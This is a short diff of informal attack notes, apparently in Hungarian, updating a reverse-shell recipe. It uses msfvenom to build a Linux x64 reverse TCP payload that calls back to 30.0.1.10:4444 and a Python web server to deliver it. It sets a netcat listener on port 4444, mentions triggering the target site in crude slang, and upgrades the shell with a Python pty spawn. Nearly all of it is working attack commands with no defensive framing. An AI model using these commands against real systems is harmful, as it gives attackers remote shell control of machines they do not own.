@@ -38,7 +38,10 @@ print_r($output);
 msfvenom -p Linux/x64/shell_reverse_tcp LHOST=30.0.1.10 LPORT=4444 -f elf > revshell
 python 3 -m http.server 8000
 
-masik terminal:
-nc 
+masik terminal (T2):
+nc -lvp 4444
 
-idk nem mukszik
+ranyomsz valamire amivel megrapeled az oldalt aztan
+
+T2 ben szinten:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
